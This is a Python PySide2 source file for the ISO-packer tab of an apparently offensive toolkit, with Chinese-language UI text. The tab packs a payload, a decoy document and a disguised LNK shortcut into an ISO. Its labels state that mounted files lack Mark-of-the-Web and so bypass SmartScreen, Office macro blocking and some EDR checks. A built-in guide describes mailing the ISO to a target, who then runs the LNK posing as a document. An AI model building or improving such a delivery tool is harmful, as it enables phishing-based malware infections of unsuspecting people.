import os
from PySide2.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QLineEdit, QPushButton, QGroupBox,
    QFileDialog, QMessageBox, QTextEdit,
    QScrollArea, QFrame, QListWidget
)
from PySide2.QtCore import Qt
from generators.iso_generator import generate_iso


class ISOTab(QWidget):
    def __init__(self):
        super().__init__()
        self.files_to_pack = []  # [{"source_path": ..., "name_in_iso": ...}]
        self.init_ui()

    def init_ui(self):
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setFrameShape(QFrame.NoFrame)
        scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)

        scroll_content = QWidget()
        content_layout = QVBoxLayout(scroll_content)
        content_layout.setContentsMargins(20, 20, 20, 20)
        content_layout.setSpacing(12)

        # 标题
        title = QLabel("ISO/IMG 打包器")
        title.setObjectName("titleLabel")
        content_layout.addWidget(title)

        subtitle = QLabel(
            "将 Payload 和诱饵文件打包为 ISO 镜像。"
            "目标双击 ISO 后 Windows 自动挂载，挂载后的文件不携带 MOTW 标记，"
            "可绕过 SmartScreen 拦截和 Office 宏禁用策略。"
        )
        subtitle.setObjectName("subtitleLabel")
        subtitle.setWordWrap(True)
        content_layout.addWidget(subtitle)

        # --- 文件列表区 ---
        files_group = QGroupBox("打包文件列表")
        files_layout = QVBoxLayout()

        self.file_list = QListWidget()
        self.file_list.setMinimumHeight(120)
        self.file_list.setStyleSheet(
            "QListWidget { background-color: #12122a; border: 1px solid #2d2d4e; border-radius: 6px; }"
            "QListWidget::item { padding: 6px; color: #e0e0e0; }"
            "QListWidget::item:selected { background-color: #e94560; }"
        )
        files_layout.addWidget(self.file_list)

        # 按钮行
        btn_row = QHBoxLayout()

        self.add_file_btn = QPushButton("➕ 添加文件")
        self.add_file_btn.clicked.connect(self.add_file)
        btn_row.addWidget(self.add_file_btn)

        self.add_lnk_btn = QPushButton("🔗 添加 LNK（从 outputs/）")
        self.add_lnk_btn.clicked.connect(self.add_lnk_from_outputs)
        btn_row.addWidget(self.add_lnk_btn)

        self.remove_file_btn = QPushButton("❌ 移除选中")
        self.remove_file_btn.clicked.connect(self.remove_file)
        btn_row.addWidget(self.remove_file_btn)

        self.clear_files_btn = QPushButton("🗑 清空列表")
        self.clear_files_btn.clicked.connect(self.clear_files)
        btn_row.addWidget(self.clear_files_btn)

        files_layout.addLayout(btn_row)

        # 在ISO中重命名
        rename_row = QHBoxLayout()
        rename_row.addWidget(QLabel("ISO内文件名:"))
        self.rename_input = QLineEdit()
        self.rename_input.setPlaceholderText("选中文件后可修改其在ISO中显示的文件名")
        rename_row.addWidget(self.rename_input, 1)
        self.rename_btn = QPushButton("✏️ 重命名")
        self.rename_btn.clicked.connect(self.rename_selected)
        rename_row.addWidget(self.rename_btn)
        files_layout.addLayout(rename_row)

        files_group.setLayout(files_layout)
        content_layout.addWidget(files_group)

        # --- ISO 设置区 ---
        settings_group = QGroupBox("ISO 设置")
        settings_layout = QVBoxLayout()

        vol_row = QHBoxLayout()
        vol_row.addWidget(QLabel("卷标名称:"))
        self.volume_input = QLineEdit()
        self.volume_input.setPlaceholderText("挂载后显示的磁盘名称")
        self.volume_input.setText("DOCUMENTS")
        vol_row.addWidget(self.volume_input, 1)
        settings_layout.addLayout(vol_row)

        out_row = QHBoxLayout()
        out_row.addWidget(QLabel("输出文件名:"))
        self.output_input = QLineEdit()
        self.output_input.setPlaceholderText("ISO 输出文件名")
        self.output_input.setText("demo.iso")
        out_row.addWidget(self.output_input, 1)
        settings_layout.addLayout(out_row)

        settings_group.setLayout(settings_layout)
        content_layout.addWidget(settings_group)

        # --- 使用说明区 ---
        guide_group = QGroupBox("攻击链路说明")
        guide_layout = QVBoxLayout()
        guide_text = QLabel(
            "推荐攻击链路：\n"
            "1. 使用 LNK 模块生成伪装快捷方式\n"
            "2. 将 LNK + Payload + 诱饵文档添加到文件列表\n"
            "3. 生成 ISO 镜像\n"
            "4. 通过邮件/网盘发送 ISO 给目标\n"
            "5. 目标双击 ISO → 自动挂载 → 看到 LNK（伪装为文档）→ 双击执行\n\n"
            "⚠️ ISO 内文件不携带 MOTW 标记，可绕过：\n"
            "   • Windows SmartScreen 拦截\n"
            "   • Office 宏自动禁用策略\n"
            "   • 部分 EDR 的文件来源检测"
        )
        guide_text.setObjectName("subtitleLabel")
        guide_text.setWordWrap(True)
        guide_layout.addWidget(guide_text)
        guide_group.setLayout(guide_layout)
        content_layout.addWidget(guide_group)

        # --- 输出预览区 ---
        preview_group = QGroupBox("输出信息")
        preview_layout = QVBoxLayout()
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setMaximumHeight(150)
        self.output_text.setPlaceholderText("生成后的信息将显示在这里...")
        self.output_text.setStyleSheet(
            "font-family: 'Consolas','JetBrains Mono',monospace; font-size: 12px;"
        )
        preview_layout.addWidget(self.output_text)
        preview_group.setLayout(preview_layout)
        content_layout.addWidget(preview_group)

        content_layout.addStretch()
        scroll_area.setWidget(scroll_content)
        main_layout.addWidget(scroll_area, 1)

        # --- 底部固定栏 ---
        bottom_bar = QWidget()
        bottom_bar.setObjectName("bottomBar")
        bottom_layout = QHBoxLayout(bottom_bar)
        bottom_layout.setContentsMargins(20, 12, 20, 12)

        self.generate_btn = QPushButton("🚀 生成 ISO 镜像")
        self.generate_btn.setObjectName("primaryButton")
        self.generate_btn.setMinimumHeight(40)
        self.generate_btn.setMinimumWidth(160)
        self.generate_btn.clicked.connect(self.generate)
        bottom_layout.addWidget(self.generate_btn)

        bottom_layout.addStretch()

        self.status_label = QLabel("")
        bottom_layout.addWidget(self.status_label)

        main_layout.addWidget(bottom_bar)

    def add_file(self):
        file_paths, _ = QFileDialog.getOpenFileNames(
            self, "选择要打包的文件", "", "所有文件 (*.*)"
        )
        for path in file_paths:
            name = os.path.basename(path)
            self.files_to_pack.append({
                "source_path": path,
                "name_in_iso": name
            })
            self.file_list.addItem(f"{name}  ←  {path}")

    def add_lnk_from_outputs(self):
        outputs_dir = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "outputs"
        )
        if not os.path.exists(outputs_dir):
            QMessageBox.warning(self, "提示", "outputs 目录不存在")
            return

        lnk_files = [f for f in os.listdir(outputs_dir) if f.endswith('.lnk')]
        if not lnk_files:
            QMessageBox.warning(self, "提示", "outputs 目录中没有 LNK 文件")
            return

        for lnk in lnk_files:
            full_path = os.path.join(outputs_dir, lnk)
            self.files_to_pack.append({
                "source_path": full_path,
                "name_in_iso": lnk
            })
            self.file_list.addItem(f"{lnk}  ←  {full_path}")

    def remove_file(self):
        row = self.file_list.currentRow()
        if row >= 0:
            self.file_list.takeItem(row)
            self.files_to_pack.pop(row)

    def clear_files(self):
        self.file_list.clear()
        self.files_to_pack.clear()

    def rename_selected(self):
        row = self.file_list.currentRow()
        new_name = self.rename_input.text().strip()
        if row >= 0 and new_name:
            self.files_to_pack[row]["name_in_iso"] = new_name
            source = self.files_to_pack[row]["source_path"]
            self.file_list.item(row).setText(f"{new_name}  ←  {source}")
            self.rename_input.clear()

    def generate(self):
        if not self.files_to_pack:
            self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
            self.status_label.setText("❌ 请先添加要打包的文件")
            return

        volume = self.volume_input.text().strip() or "DOCUMENTS"
        output_fn = self.output_input.text().strip() or "demo.iso"
        if not output_fn.endswith(('.iso', '.img')):
            output_fn += ".iso"

        success, message = generate_iso(self.files_to_pack, volume, output_fn)

        if success:
            self.status_label.setStyleSheet("color: #00b894; font-weight: bold;")
            self.status_label.setText("✅ ISO 生成成功")
            self.output_text.setText(message)
        else:
            self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
            self.status_label.setText(f"❌ {message}")
            self.output_text.setText(message)
